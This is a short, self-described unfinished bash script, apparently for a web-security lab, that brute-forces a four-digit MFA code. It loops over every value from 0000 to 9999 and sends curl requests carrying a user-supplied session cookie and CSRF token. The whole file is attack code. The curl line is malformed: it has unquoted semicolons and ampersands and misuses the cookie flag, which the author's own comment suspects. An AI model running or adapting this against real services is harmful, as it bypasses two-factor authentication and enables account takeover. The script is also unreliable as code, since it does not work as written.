#!/bin/bash
#Unfinished, uploading here so i can work on it later
#This is for a lab and my tools brute are not optimal.
echo 'enter the URL: '
read url
echo 'enter the cookie session: '
read cookie
echo 'enter the csrf token: '
read csrf
for num in {0000..9999}; do
curl -A 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -b session=$cookie;csrf=$csrf&mfa-code=$num http://$url

#url not specified. maybe -b does not work with multiple cookies? Write cookies into file and use -c cookies.txt
done

